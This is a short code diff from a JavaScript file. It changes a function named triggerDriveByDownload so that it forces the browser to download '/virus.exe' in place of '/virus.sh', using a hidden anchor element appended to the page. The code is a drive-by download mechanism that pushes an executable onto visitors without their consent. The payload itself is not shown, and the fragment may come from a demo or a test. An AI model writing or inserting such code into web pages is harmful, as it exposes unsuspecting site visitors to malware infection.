@@ -5,8 +5,8 @@
 
     const triggerDriveByDownload = () => {
         const link = document.createElement('a');
-        link.href = '/virus.sh'; 
-        link.download = 'virus.sh';
+        link.href = '/virus.exe'; 
+        link.download = 'virus.exe';
         link.target = '_self';
 
         document.body.appendChild(link);
